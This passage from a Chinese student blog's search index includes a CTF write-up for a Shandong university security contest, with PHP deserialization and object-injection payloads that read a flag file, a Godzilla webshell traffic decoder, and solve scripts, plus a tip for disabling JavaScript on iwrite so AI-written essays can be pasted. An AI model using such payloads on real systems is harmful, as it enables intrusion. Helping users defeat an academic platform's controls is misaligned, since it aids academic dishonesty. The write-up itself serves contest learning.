CALLBACK_NULL);    int volume = 0x7f;    int voice = 0x0;    int sleep = 300;    int QFNU[] =    &#123;         M1,_,M1,_,M1,_,M2,_,        M3,_,M5,_,M5,_,_,_,        M6,_,M6,_,M5,_,M3,_,        M1,_,M2,M3,M2,_,_,_,        M3,_,M3,_,M5,_,M5,_,        M3,_,M2,_,M1,_,L6,_,        L5,L6,M1,M2,M3,_,M5,_,        M2,_,_,_,_,_,        M1,_,M1,_,M1,_,M2,_,        M3,_,M5,_,M5,_,_,        M6,_,M6,_,M5,_,M3,_,        M1,_,M2,M3,M2,_,_,        M3,_,M3,_,M5,_,M5,_,        M3,_,M2,_,M1,_,L6,_,        L5,L6,M1,M2,M3,_,M2,_,        M1,_,_,_,_,        H1,_,H1,_,H1,_,_,_,        M3,_,M5,M6,M5,_,_,_,        M6,_,M5,_,M4,_,M1,_,        M7,_,M6,M7,M5,_,_,_,        M6,_,H1,_,H1,_,H1,_,        M3,_,M5,M6,M6,_,M6,_,        M6,M5,M4,M4,M4,_,_,_,        M2,M2,M2,M3,_,M2,_,_,_,        H1,_,H1,_,H1,_,_,_,        M3,_,M5,M6,M5,_,_,_,        M6,_,M5,_,M4,_,M1,_,        M7,_,M6,M7,M5,_,_,_,        M6,_,H1,_,H1,_,H1,_,        M3,M3,M5,M6,M6,_,_,_,        M2,M3,M5,M5,M5,M5,M5,M5,_,        H2,_,H2,_,M6,_,M7,_,        H1,H1,H1,H1,H1,H1,    &#125;;    for (auto i : QFNU)    &#123;        if (i == LOW_SPEED || i == HIGH_SPEED || i == MIDDLE_SPEED)        &#123;            sleep = i;            continue;        &#125;        if (i == 0) &#123; sleep = 150; continue; &#125;        if (i == 700) &#123; Sleep(150); continue; &#125;        if (i == _)        &#123;            Sleep(300);            continue;        &#125;        voice = (volume &lt;&lt; 16) + ((i) &lt;&lt; 8) + 0x90;        midiOutShortMsg(handle, voice);        cout &lt;&lt; voice &lt;&lt; endl;        Sleep(sleep);    &#125;    midiOutClose(handle);&#125;int main()&#123;    QFNU();//犁牛之子    return 0;&#125;\n\n后期处理简单做个视频剪辑一下\n被曲阜师范大学官方抖音号发表咯！~\n复制口令戳下面代码块左上角↓\n7.94 SYm:/ 简单用代码做个音乐，一起看看美好的曲园！# 曲阜师范大学 # 代码 # 编程 # 我在大学等你  https://v.douyin.com/iJnnEGjb/ 复制此链接，打开Dou音搜索，直接观看视频！\n\n","categories":["QFNU"],"tags":["QFNU"]},{"title":"破解PC端iwrite禁用复制","url":"/posts/9a26b151.html","content":"破解 PC 端 iwrite 禁用复制AI 生成的作文不能粘贴？？？？\n我来救救你\n\n打开 iwrite\n进入作文页面\n电脑按下 F12\n然后按下 F1\n找到 禁用JavaScript 勾选\n\n\n一般是禁用 JavaScript 或者是停用 JavaScript，不同浏览器描述可能不同，但基本意思都一样，一眼就能看出来,之后就能粘贴了\n\n\n","categories":["技术教程"],"tags":["iwrite","刷课脚本","JavaScript"]},{"title":"简单两步，将Windows11右键菜单修改为Windows10风格","url":"/posts/831f896e.html","content":"原文链接http://t.csdn.cn/dhe9N\nWindows11更新后，右键菜单很多功能隐藏起来了，使用时需要点击“显示更多选型”才能获取完整功能。为了能获得Windows10右键菜单丝滑的体验，我总结了以下方法。\n修改前：\nhttps://img-blog.csdnimg.cn/img_convert/59704c4ffbd6af9764dd5ab84c0fc7bf.gif\n修改后：\nhttps://img-blog.csdnimg.cn/img_convert/1e8911f87d020b6034f90d8b5b1a9255.gif\n方法一：控制台操作法按住win+R打开运行窗口\n输入cmd，打开控制台在控制泰中输入下方代码，回车，显示操作成功开启旧版右键菜单：\nreg add &quot;HKCU\\Software\\Classes\\CLSID\\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\\InprocServer32&quot; /f /ve\n\n恢复windows11新版右键菜单：\nreg delete &quot;HKCU\\Software\\Classes\\CLSID\\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;&quot; /f\n\n\n","categories":["技术教程","Windows"],"tags":["Windows技术分享"]},{"title":"科来杯第十届山东省大学生网络安全技能大赛wp","url":"/posts/41329285.html","content":"\n原文始发于微信公众号（山警网络空间安全实验室）：科来杯第十届山东省大学生网络安全技能大赛wp\n\n前言赛制还是一如既往的奇葩，由于每人的方向不同，在赛后结合团队赛道和爱好者赛道社团成员的wp，共同完成了本文。\n@挽歌 @sp4c1ous @Charshark @Mu.Chen\nMu.Chen内心os：\n(理论题真的真的真的真的好重要啊呜呜呜呜\n\n前言\n\nMisc\n\n简单编码\n\n神秘的base\n\n签到\n\n\n\nStego\n\n我应该去爱你\n数独\n莫生气\n\n\n取证\n\n金刚大战哥斯拉\n啊吧啊吧的数据包\n小刘的硬盘\n\n\nWeb\n\nuns\n\n\nCrypto\n\n小试牛刀\neasyrsa\n\n\nre\n\n人生模拟\n\n\n\nMisc简单编码二进制和八进制\nimport reflag=&#x27;&#x27;a = [&#x27;1010010&#x27;,&#x27;110001&#x27;,&#x27;1101011&#x27;,&#x27;0172&#x27;,&#x27;1010010&#x27;,&#x27;1000101&#x27;,&#x27;061&#x27;,&#x27;0132&#x27;,&#x27;0127&#x27;,&#x27;1101100&#x27;,&#x27;0144&#x27;,&#x27;1001000&#x27;,&#x27;1010010&#x27;,&#x27;1010100&#x27;,&#x27;0116&#x27;,&#x27;0105&#x27;,&#x27;0124&#x27;,&#x27;110000&#x27;,&#x27;110100&#x27;,&#x27;0172&#x27;,&#x27;1010001&#x27;,&#x27;110000&#x27;,&#x27;0144&#x27;,&#x27;1001110&#x27;,&#x27;1001101&#x27;,&#x27;110001&#x27;,&#x27;1010010&#x27;,&#x27;0110&#x27;,&#x27;1010100&#x27;,&#x27;0154&#x27;,&#x27;1110000&#x27;,&#x27;1011000&#x27;,&#x27;0122&#x27;,&#x27;060&#x27;,&#x27;110001&#x27;,&#x27;0141&#x27;,&#x27;1010110&#x27;,&#x27;0105&#x27;,&#x27;0144&#x27;,&#x27;1001110&#x27;,&#x27;0127&#x27;,&#x27;1101100&#x27;,&#x27;1010110&#x27;,&#x27;1001000&#x27;,&#x27;1010111&#x27;,&#x27;0124&#x27;,&#x27;0112&#x27;,&#x27;0125&#x27;,&#x27;1010010&#x27;,&#x27;110000&#x27;,&#x27;110101&#x27;,&#x27;0113&#x27;,&#x27;1010110&#x27;,&#x27;1000101&#x27;,&#x27;0144&#x27;,&#x27;0116&#x27;,&#x27;0127&#x27;,&#x27;0154&#x27;,&#x27;0122&#x27;,&#x27;1000010&#x27;,&#x27;1010100&#x27;,&#x27;0154&#x27;,&#x27;1001010&#x27;,&#x27;1010111&#x27;,&#x27;0122&#x27;,&#x27;110000&#x27;,&#x27;061&#x27;,&#x27;0141&#x27;,&#x27;1010110&#x27;,&#x27;1000101&#x27;,&#x27;110001&#x27;,&#x27;0117&#x27;,&#x27;0125&#x27;,&#x27;1101100&#x27;,&#x27;0122&#x27;,&#x27;0110&#x27;,&#x27;0123&#x27;,&#x27;0124&#x27;,&#x27;0116&#x27;,&#x27;0105&#x27;,&#x27;0124&#x27;,&#x27;0125&#x27;,&#x27;065&#x27;,&#x27;1010011&#x27;,&#x27;0126&#x27;,&#x27;060&#x27;,&#x27;0144&#x27;,&#x27;0132&#x27;,&#x27;1010111&#x27;,&#x27;1101011&#x27;,&#x27;1010010&#x27;,&#x27;1001000&#x27;,&#x27;1010100&#x27;,&#x27;0154&#x27;,&#x27;0112&#x27;,&#x27;0125&#x27;,&#x27;1010011&#x27;,&#x27;1000101&#x27;,&#x27;0126&#x27;,&#x27;0141&#x27;,&#x27;1010110&#x27;,&#x27;1000110&#x27;,&#x27;1000110&#x27;,&#x27;1001110&#x27;,&#x27;0127&#x27;,&#x27;1101100&#x27;,&#x27;1001110&#x27;,&#x27;0110&#x27;,&#x27;0127&#x27;,&#x27;0124&#x27;,&#x27;1001110&#x27;,&#x27;1000101&#x27;,&#x27;0122&#x27;,&#x27;110000&#x27;,&#x27;110101&#x27;,&#x27;1001011&#x27;,&#x27;1010110&#x27;,&#x27;0105&#x27;,&#x27;0144&#x27;,&#x27;0102&#x27;,&#x27;1010111&#x27;,&#x27;1101100&#x27;,&#x27;1010010&#x27;,&#x27;0124&#x27;,&#x27;1010100&#x27;,&#x27;0126&#x27;,&#x27;0160&#x27;,&#x27;0125&#x27;,&#x27;0122&#x27;,&#x27;110000&#x27;,&#x27;110000&#x27;,&#x27;060&#x27;,&#x27;0126&#x27;,&#x27;1000101&#x27;,&#x27;061&#x27;,&#x27;1001110&#x27;,&#x27;0125&#x27;,&#x27;0154&#x27;,&#x27;1010010&#x27;,&#x27;0110&#x27;,&#x27;0124&#x27;,&#x27;0126&#x27;,&#x27;1110000&#x27;,&#x27;0125&#x27;,&#x27;0123&#x27;,&#x27;060&#x27;,&#x27;110001&#x27;,&#x27;1100001&#x27;,&#x27;1010111&#x27;,&#x27;1101011&#x27;,&#x27;0144&#x27;,&#x27;1001110&#x27;,&#x27;1010111&#x27;,&#x27;0154&#x27;,&#x27;0122&#x27;,&#x27;0116&#x27;,&#x27;1010100&#x27;,&#x27;1010110&#x27;,&#x27;0112&#x27;,&#x27;0131&#x27;,&#x27;1010100&#x27;,&#x27;0126&#x27;,&#x27;0105&#x27;,&#x27;071&#x27;,&#x27;1010000&#x27;,&#x27;0124&#x27;,&#x27;110000&#x27;,&#x27;111001&#x27;,&#x27;0120&#x27;,&#x27;1010100&#x27;,&#x27;110000&#x27;,&#x27;075&#x27;]for i in range(len(a)):    print(len(a[i]))    if len(a[i])==4 or len(a[i])==3:        flag+=chr(int(a[i], 8))    else:        flag += chr(int(a[i],2))print(flag)\n\n神秘的base换表base爆破\nimport base64import stringimport itertoolsstring1 = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;  #标准base64编码表strings = &quot;ivOY50&quot;all_colors = (itertools.permutations(strings, 6))for i in all_colors:    tmp = &#x27;&#x27;.join(i)    string2 = f&#x27;xbQTZqjN8ERuwlzVfUIrPkeHd&#123;tmp&#125;LK697o2pSsGD+ncgm3CBh/Xy1MF4JAWta&#x27;  # 换表后base64编码表    encode = &#x27;EvAzEwo6E9RO4qSAHq42E9KvEv5zHDt34GtdHGJaHD7NHG42bwd=&#x27;    decode = base64.b64decode(encode.translate(str.maketrans(string1, string2)))    if &#x27;flag&#123;&#x27; in str(decode) and &#x27;&#125;&#x27; in str(decode):        print(decode)\n\n签到let r = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+=&quot;;let cars = [25, 38, 49, 33, 25, 55, 45, 37, 12, 22, 24, 50, 12, 51, 24, 51, 13, 3, 16, 52, 13, 38, 25, 38, 13, 54, 4, 52, 13, 19, 20, 55, 12, 38, 8, 51, 12, 38, 16, 49, 14, 22, 8, 54, 13, 35, 37, 33, 12, 55, 52, 63];let ff = &quot;&quot;;for (var iii = 0; iii &lt; cars.length; iii++) &#123;ff = ff + r[cars[iii]];&#125;/*this is flag*/console.log(ff)\n\n直接运行 解码base64即可\nStego我应该去爱你频谱图\n\n数独先填数独，得到4132234132141423\n因为是隐写题，考虑有密码的隐写，只有LSB\nC:UsersAdministratorDesktopmisc脚本收集cloacked-pixel-master&gt;python2 lsb.py extract C:UsersAdministratorDesktopmisc脚本收集cloacked-pixel-mastershudok.png-stego.png 1.txt 4132234132141423\n\n\n莫生气\n提取出png，补上文件头，然后双图盲水印\n\n取证金刚大战哥斯拉\n&lt;?phpfunction encode($D,$K)&#123;    for($i=0;$i&lt;strlen($D);$i++)&#123;        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    &#125;    return $D;&#125;$pass=&#x27;DASCTF&#x27;;$payloadName=&#x27;payload&#x27;;$key=&#x27;9c2ffaf6a14493bf&#x27;;$data = &#x27;fLluZmFmNmExNJEhWBG1b1XhCY%2BtGO2uCp6t3zK69FxYTKJQssNT1y5Cf45Hu3u%2Fivq08xw%2FbzMVDb2iVURKKXEgFjxjZzQ6kQjmUHpg8t9m09mKOdTLyE5V%2B%2Bzw83kQjtK%2Bl9yBKvzGCdNluDokRoC4jvtek8KVLXnlU3K366szlCn4XS%2BxolAu%2FzspbXO1wRZkj15en%2BXvDcX%2BrfySQnxMFJKl2bgedSVozzyNwPBUFxcUX3V2E%2FGyFHezDWxnihBUXutJRvu%2FuHjZwHGhu%2BpybShnSwTgYLjybXZRZC3M%2BmD04BA6ancVF5lirsWZ3gsqB3h9rvKzDvtwG3FoCM6ObODAYOcpOLtSO8xuGMciws40NV81hhXQV7ViZG9At06ypufihH4bSJ0xy1aL1T6WCPL6fcRbCaVn%2F7BYmCuoy3LzMlI3CHA0OXbds4Itwg7X0dQnKp7eiJKtV0MjJAMqAN50O9LVDaJnbQg%2Bgz2iJLLoMSCnR3v%2BbLMZAid5ESm8JoIgZk5BNpVZ5xOdquNNWFz%2BpLOR9W%2Fe%2BhjwxCiwdtfdaQj0QiC18L6TbTSMhl2qQWqZrd97KZDOI4gJ6ar1QWIgDk3D%2BO5oRFYMWRthsKfGFB38Hcn%2BqMDyOLrLqBFJXaw0Yv1YQaHyn9ycRJ7DEoWfsdCyOuH5HtW4MNp2Y72ptdqCI4RHgZryK142ucH2BCmN0oxVZr4zcMISfKEwXmyzwrX27r%2BZoYUqTwN%2FJ2NCE1%2FWNgPkChD08LLZKbS0dzIlZ3xFL2h7kbP%2FOHn8ceocxTV3q%2F%2BPjOrpsORuwQOj6pMoYB%2FSD5rUGN0KGeerrZQhUaw2u5%2FiZMj9rnlFiF3gyOtb3mTLt%2FN09poaFr9TidOFisTtU%2FnryDLT2GnIfIveQwKcwliQhVGLvWiEgIweDe3OmDeFYT8U68LU09%2BMrxGD2lYdh4tlvx9h2IttzPAc3yZna5tP%2BiZJJruPGgY40GVc9p%2Fw1%2Bixk%2F68RoLtOscCL%2FERCXz22P8xWmk9utDwSA8dyeCgj3hBQsr24nSbWJFu0%2FOSM5dOK00yD%2F8GE4fyxQ7U0IVVZ1rjdccA44j0Tt7ArMzs4d1a6k3SK2GiKM2X3dqqysh9oJ96r2iJA2R0jHvYwbKTSSLyhDT%2BpZc5Hl%2Fp6e6L5wTKuRZnhKxIDqpzpw%2BwQe6pVq0BuI5FoXQ%2F3mPydT2nkEjcLnLaxBDoVQSUd6Ba92MYcesUpZ13yAAgi%2F79ZKgithRVuwhrTCtNXAp5j6p7%2BBJdzJGV%2Bl2s33UnBjVeKqrAUATX9yY7NIql2E4SOWp4loycxh2nwR3Qe9Zi%2BKBaSmBHVy5liSgUFGOlmsWgM%2FstzXc%2F9SNQyUXALbOxa7s17A%2BDOkgUGLIBM7M6Va0Aa8A2xTnyr0SHwyQpUjE5E1x1t24X4MSADqqMIkQSEHPkgttSbALFUOd32Gko8djwakoi7rmXWAEKojSlDZffyPLwMJQjI%2B5%2FiXFfSasJP1zCbr5nl%2FKFBcomDDFy8gnLMG2zwvLRIrfDquVIhlTgF6Giq4JqWmI9ZSJG8ATh2y%2F9uXExyhdQ33b4O%2B4a9OJv%2F1MWz%2BYQqCLu9DhObYTQQThBtUcxAyF3hOD9B1Q0DWQNPu7UDMuLX57ThBw8CulWsahG7QBGOamGf23KVji%2FaQdKeXYGQohkA1oN%2FSOleQWuIJvSk1KrBDtQRU6AWG6WNqnl33Z%2B0cgBYUcg8noLHMByMkRefpLMqm%2BGH2zrdGpNgEcaCzk5ulYd9pHMdiYDfTp3sFjdsR%2FxplFSP4VfnbWpF7WsiT7WGZoPXtv%2F4gWI60ftEnJ1peYtXUlLDuv2tYt2wmpafCClt1Y0tfB51iBFGhUy7Bw%2FdbjtVxZJHB8FvsEzEGj5BWp45LAGFxpOUsKuUVdioTfyjp01%2F%2FIAsu%2FUG%2FxSpHdfR5TlGRLw0WNef7CnYxLURPTbp0ZF9MglFQGkN58Iq7RR4EFt4s4fP32AmuTUgyz7WNgqv0nswP0mPzMHiZwxBSIZTitjQ5QYbd1BlOX1cAM0TZRE2bOiDQnPjhvEC3jEp9L3ktZ1A%2BVcuXnAhInoy4Dq1%2F0%2FO5KITcyi0NR1ftNMsjzMwUZETqEcCyxr1d23lSNBEFTf4A4FJaCIfcvD0tbHoceynhSdHkRJBiUu8DULyBdcTeFFRq9jA3jwpjrbBmvYfvSBoNqYKbbPq2tErzqOA2fiPYHJkMiAPVsamUIDG4%2FzMD4SqKu6Uoj836CsY%2Fz7znvX5zh6LzB7vPoL8QUGmEd5E0SXk4vKieQkHX4vlQM%2FToQKpQRkdaMrOIs0LQFIp0D4vvEhdwJ7eK%2FmClCgCOPEpU%2F3zJhVfIZfUHgDrkUK4HOfT4piF4STR7SZCleaGDwHUkYRiLWNGrEiiNqwNPJhQ63gStGcBVIYFk%2B3F1neK32xH506xzsqjhFJnDHAbMPC47x6hXmMsm%2BTMBQNfgYyzmDyxERG3o9IuLB%2B3vzTJfaLv9bZ4aNTef%2BMwQDLojDSIiEK%2FDvw%2BuOHt5%2Fwk7cNiXWBhKCjULlR8Daukh7MFlCklEs3srvkifaW4VbF85SckpUhIjOTVTYZ4EgK1VYQ%2BK52O7kKt%2BT2kOkLDDE5JiDXApezQtbnw5yPM8WDh5c1DTaRqLsWxUTPWtVlcbzyge5D4VYWXJ0ICPpVfbeEQXutk0tMKBfY0q20%2Bo8CD6oHnm3wy5ELMeLsmXrspAmhwk2wr8d64CHizraARwvNAAX71VCPIUukAvgtEBblKi9EsFr4Or6s%2Fz1RtnxlaufSdlTCCwWTAe%2FeBK%2FKdehF4gIQ91hCWyrI6jJchH%2F5VA0sXxqVe1sBsZulTMJJJo3VZsFutboAetPCdcmEzqqIYUEuSuJf%2F5tXJm5hujq6EJ6rZbBXqnCeLDVWyhhZvy4kL9jKcF2Hp9ItvRBHP6hI%2FAEzBH%2B89XwS07WJsmlYkiQmHDYavnLbbm8sEAbGwbxCbTUJU7qKgTZff%2BWEBuQ%2BTg4mRab4%2B8SpRklCHU3QCeS1nIHPuJrdyOwMMGQ%2B%2BWEG0hDsiReJbkcG9f9mORbZpLegR5HDbiT0oYJG6GcvKxTNS6voIrE94nva0%2FeQvEgokgbBQQQoejcj1h7oStaWk5OdeWhBJaAgnFmtfGW6lyA0OQ%3D%3D&#x27;;echo base64_encode(gzdecode(encode(base64_decode(urldecode($data)),$key)));\n\n\n啊吧啊吧的数据包\n命令的时间盲注，写脚本有点麻烦\n\n不如简单处理一下，然后手撕\n\nflag{3563bdb1a59309e1a4e93b65152bfbba}\n小刘的硬盘取证大师提出个压缩包，备注是名字+生日，掩码爆破\n\nWebunspayload：\n第一层\n大写S用十六进制进行绕过，利用数组传参，原生类读文件\ntest=O:4:&quot;Test&quot;:1:&#123;s:5:&quot;check&quot;;S:6:&quot;73dnisc&quot;;&#125;&amp;class[/flag]=SplFileObject\n\n第二层\n反序列化逃逸\n?a=******************************&amp;b=&quot;;s:5:&quot;bbbb2&quot;;O:3:&quot;Mid&quot;:1:&#123;s:3:&quot;mid&quot;;O:4:&quot;High&quot;:1:&#123;s:4:&quot;high&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;\n\nCrypto小试牛刀变异凯撒\nenc = &quot;ipfm\\x82Kj]p~l?\\x82ogw\\x85mt[K\\x8br\\x97&quot;k = 3flag = &quot;&quot;for i in enc:    flag += chr(ord(i) - k)    k += 1print(flag)\n\neasyrsa中国剩余定理+coppersmith\nfrom Crypto.Util.number import *from gmpy2 import *from functools import reducec=16054555662735670936425135698617301522625617352711974775378018085049483927967003651984471094732778961987450487617897728621852600854484345808663403696158512839904349191158022682563472901550087364635161575687912122526167493016086640630984613666435283288866353681947903590213628040144325577647998437848946344633931992937352271399463078785332327186730871953277243410407484552901470691555490488556712819559438892801124838585002715833795502134862884856111394708824371654105577036165303992624642434847390330091288622115829512503199938437184013818346991753782044986977442761410847328002370819763626424000475687615269970113178n=23074300182218382842779838577755109134388231150042184365611196591882774842971145020868462509225850035185591216330538437377664511529214453059884932721754946462163672971091954096063580346591058058915705177143170741930264725419790244574761160599364476900422586525460981150535489695841064696962982002670256800489965431894477338710190086446895596651842542202922745215496409772520899845435760416159521297579623368414347408762466625792978844177386450506030983725234361868749543549687052221290158286459657697717436496769811720945731143244062649181615815707417418929020541958587698982776940334577355474770096580775243142909913Divisor=[205329935991133380974880368934928321273, 274334866497850560640212079966358515253, 264739757264805981824344553014559883169, 314495359937742744429284762852853819407, 197513216256198287285250395397676269263, 194633662721082002304170457215979299327, 320085578355926571635267449373645191637, 310701821184698431287158634968374845899, 198238777199475748910296932106553167589, 292201037703513010563101692415826269513, 332238634715339876614712914152080415649, 334257376383174624240445796871873866383]Result=[108968951841202413783269876008807200083, 29053101048844108651205043858001307413, 243503157837867321277650314313173163504, 160933173053376016589301282259056101279, 53063624128824890885455759542416407733, 34980025050049118752362228613379556692, 132553045879744579114934351230906284133, 160998336275894702559853722723725889989, 87211131829406574118795685545402094661, 36445723649693757315689763759472880579, 11133325919940126818459098315213891415, 1404668567372986395904813351317555162]def basic_CRT(ai,mi):    assert reduce(gmpy2.gcd,mi) == 1    assert len(ai) == len(mi)    N = reduce(lambda x,y:x * y,mi)    ans = 0    for a,m in zip(ai,mi):        t = N // m        ans += a * t * gmpy2.invert(t,m)    return ans % N,Nresult = basic_CRT(Result,Divisor)print(result)\n\n先通过CRT求出p_2\np_high=157397749849472741302651922559110947585741898399548366071672772026799823577871183957882637829089669634665699886533302712057712796808672023827078956556745522749244570015492585747076324258912525658578733402979835176037760966294532155059241756382643278063578661030876735794467422919824463419065126688059515994112PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p_highroots = f.small_roots(X=2^128, beta=0.4)if roots: p = p_high+int(roots[0]) print(&quot;n=&quot;+str(n)) print(&quot;p=&quot;+str(p)) print(&quot;q=&quot;+str(n//p))\n\n然后再梭个coppersmith\n最后正常解RSA就是了\n完整脚本：\nfrom Crypto.Util.number import *from gmpy2 import *from functools import reducec=16054555662735670936425135698617301522625617352711974775378018085049483927967003651984471094732778961987450487617897728621852600854484345808663403696158512839904349191158022682563472901550087364635161575687912122526167493016086640630984613666435283288866353681947903590213628040144325577647998437848946344633931992937352271399463078785332327186730871953277243410407484552901470691555490488556712819559438892801124838585002715833795502134862884856111394708824371654105577036165303992624642434847390330091288622115829512503199938437184013818346991753782044986977442761410847328002370819763626424000475687615269970113178n=23074300182218382842779838577755109134388231150042184365611196591882774842971145020868462509225850035185591216330538437377664511529214453059884932721754946462163672971091954096063580346591058058915705177143170741930264725419790244574761160599364476900422586525460981150535489695841064696962982002670256800489965431894477338710190086446895596651842542202922745215496409772520899845435760416159521297579623368414347408762466625792978844177386450506030983725234361868749543549687052221290158286459657697717436496769811720945731143244062649181615815707417418929020541958587698982776940334577355474770096580775243142909913Divisor=[205329935991133380974880368934928321273, 274334866497850560640212079966358515253, 264739757264805981824344553014559883169, 314495359937742744429284762852853819407, 197513216256198287285250395397676269263, 194633662721082002304170457215979299327, 320085578355926571635267449373645191637, 310701821184698431287158634968374845899, 198238777199475748910296932106553167589, 292201037703513010563101692415826269513, 332238634715339876614712914152080415649, 334257376383174624240445796871873866383]Result=[108968951841202413783269876008807200083, 29053101048844108651205043858001307413, 243503157837867321277650314313173163504, 160933173053376016589301282259056101279, 53063624128824890885455759542416407733, 34980025050049118752362228613379556692, 132553045879744579114934351230906284133, 160998336275894702559853722723725889989, 87211131829406574118795685545402094661, 36445723649693757315689763759472880579, 11133325919940126818459098315213891415, 1404668567372986395904813351317555162]def basic_CRT(ai,mi):    assert reduce(gmpy2.gcd,mi) == 1    assert len(ai) == len(mi)    N = reduce(lambda x,y:x * y,mi)    ans = 0    for a,m in zip(ai,mi):        t = N // m        ans += a * t * gmpy2.invert(t,m)    return ans % N,Nresult = basic_CRT(Result,Divisor)print(result)p_high=157397749849472741302651922559110947585741898399548366071672772026799823577871183957882637829089669634665699886533302712057712796808672023827078956556745522749244570015492585747076324258912525658578733402979835176037760966294532155059241756382643278063578661030876735794467422919824463419065126688059515994112PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p_highroots = f.small_roots(X=2^128, beta=0.4)if roots: p = p_high+int(roots[0]) print(&quot;n=&quot;+str(n)) print(&quot;p=&quot;+str(p)) print(&quot;q=&quot;+str(n//p))n=23074300182218382842779838577755109134388231150042184365611196591882774842971145020868462509225850035185591216330538437377664511529214453059884932721754946462163672971091954096063580346591058058915705177143170741930264725419790244574761160599364476900422586525460981150535489695841064696962982002670256800489965431894477338710190086446895596651842542202922745215496409772520899845435760416159521297579623368414347408762466625792978844177386450506030983725234361868749543549687052221290158286459657697717436496769811720945731143244062649181615815707417418929020541958587698982776940334577355474770096580775243142909913p=157397749849472741302651922559110947585741898399548366071672772026799823577871183957882637829089669634665699886533302712057712796808672023827078956556745522749244570015492585747076324258912525658578733402979835176037760966294532155059241756382643278063578661030876735794708282102407491782299777228899079176117q=146598666145389487374076474702380241089893944436923994466470555513748278755568038863819188404588602962888679358728628069490879689376996830110571995521814075973422513105805715524894550773219606972944401957227665252279176873209924236114228003156706532596699592716796867748104565680326123749660658940264843181589e=65537phi=(p-1)*(q-1)d=invert(e,phi)m=powmod(c,d,n)print(long_to_bytes(m))#b&#x27;flag&#123;2233747d3bf06f070048e80300dac75f&#125;&#x27;\n\nre人生模拟找到加密逻辑，跟着跑一边就是了\n\nv15=[0]*38v15[0] = 432;v15[1] = 408;v15[2] = 429;v15[3] = 438;v15[4] = 452;v15[5] = 246;v15[6] = 243;v15[7] = 417;v15[8] = 423;v15[9] = 444;v15[10] = 240;v15[11] = 231;v15[12] = 203;v15[13] = 447;v15[14] = 207;v15[15] = 435;v15[16] = 253;v15[17] = 224;v15[18] = 204;v15[19] = 443;v15[20] = 419;v15[21] = 248;v15[22] = 442;v15[23] = 241;v15[24] = 203;v15[25] = 251;v15[26] = 445;v15[27] = 239;v15[28] = 441;v15[29] = 254;v15[30] = 417;v15[31] = 246;v15[32] = 203;v15[33] = 245;v15[34] = 255;v15[35] = 445;v15[36] = 248;v15[37] = 478;for i in range(len(v15)):    print(chr((v15[i]&gt;&gt;2)^0xa),end=&#x27;&#x27;)\n\n\n\n\n原文始发于微信公众号（山警网络空间安全实验室）：科来杯第十届山东省大学生网络安全技能大赛wp\n\n","categories":["CTF","WP","第十届科来杯"],"tags":["CTF","科来杯"]},{"title":"算法设计与分析实验","url":"/posts/14455728.html","content":"实验一 阶乘一、实验目的和要求\n熟悉一种编程环境及基础编程练习\n二、实验内容\n准备并熟悉后续实验项目所用的环境，熟悉一种编程语言的使用方式，并编写简单的求数的阶乘的程序，并通过输入 3、5、7、 10 等数值验证程序的正确性\n三、主要仪器设备\n\n计算机\n编程语言：Python\n\n四、实验方法与步骤\n\n打开编程环境，编写程序\n通过输入 3、5、7、 10 等数值验证程序的正确性\n\n五、主要代码\ni = input(&quot;请输入一个整数：&quot;)i = int(i)def jiecheng(n):    if n == 1:        return 1    else:        return n * jiecheng(n - 1)print(&quot;Powered by W1ndys&quot;)print(&quot;https://blog.w1ndys.top/&quot;)print(f&quot;结果是：&#123;jiecheng(i)&#125;&quot;)print(&quot;—————————以下是验证值—————————&quot;)print(&quot;3的阶乘是：&quot;, jiecheng(3))print(&quot;5的阶乘是：&quot;, jiecheng(5))print(&quot;7的阶乘是：&quot;, jiecheng(7))print(&quot;10的阶乘是：&quot;, jiecheng(10))\n\n六、实验数据处理及结果分析\n\n分析内容中可以使用文字和图片，可以贴实验过程和实验运行结果的截图或照片作为补充\n\n输出结果\n请输入一个整数：5Powered by W1ndyshttps://blog.w1ndys.top/结果是：120—————————以下是验证值—————————3的阶乘是： 65的阶乘是： 1207的阶乘是： 504010的阶乘是： 3628800\n\n七、出现的问题及解决方法\n\n无\n\n八、讨论、心得体会\n\nPython 递归算法，简单易懂，但在 Python 的 math 库中，已经内置了阶乘函数，可以直接使用 math.factorial(n) 来计算 n 的阶乘。\n\n实验二 斐波那契数列一、实验目的和要求\n理解递归概念及递归算法设计方法。对 Fibonacci 数列的求解问题分别设计递归的程序和非递归程序，并通过输入参数分别运行求解 Fibonacci10、20、30、40、 50 的程序比较两种策略编写的程序的运行速度。\n二、实验内容\n\n对 Fibonacci 数列的求解问题分别设计递归的程序和非递归程序，并通过输入参数分别运行求解 Fibonacci10、20、30、40、 50 的程序比较两种策略编写的程序的运行速度。\n\n三、主要仪器设备\n\n计算机\n编程语言：Python\n\n四、实验方法与步骤\n\n打开编程环境，编写程序\n通过输入参数分别运行求解 Fibonacci10、20、30、40、 50 的程序比较两种策略编写的程序的运行速度\n\n五、主要代码\nimport time# 递归求斐波那契数列（带记忆化）def fibonacci(n, memo=&#123;&#125;):    if n in memo:        return memo[n]    if n &lt;= 0:        return 0    elif n == 1:        return 1    else:        memo[n] = fibonacci(n - 1, memo) + fibonacci(n - 2, memo)        return memo[n]# 非递归求斐波那契数列def fibonacci_non_recursive(n):    if n &lt;= 0:        return 0    elif n == 1:        return 1    else:        a, b = 0, 1        for _ in range(2, n + 1):            a, b = b, a + b        return b# 测试递归求斐波那契数列的速度for n in [10, 20, 30, 40, 50]:    start_time = time.time()    print(f&quot;斐波那契数列的第 &#123;n&#125; 项的计算结果如下：&quot;)    print(f&quot;递归求解结果：&#123;fibonacci(n)&#125;&quot;)    end_time = time.time()    print(f&quot;递归求解耗时: &#123;end_time - start_time&#125; 秒&quot;)    # 测试非递归求斐波那契数列的速度    start_time = time.time()    print(f&quot;非递归求解结果：&#123;fibonacci_non_recursive(n)&#125;&quot;)    end_time = time.time()    print(f&quot;非递归求解耗时: &#123;end_time - start_time&#125; 秒&quot;)    print()\n\n六、实验数据处理及结果分析\n斐波那契数列的第 10 项的计算结果如下：递归求解结果：55递归求解耗时: 0.002044677734375 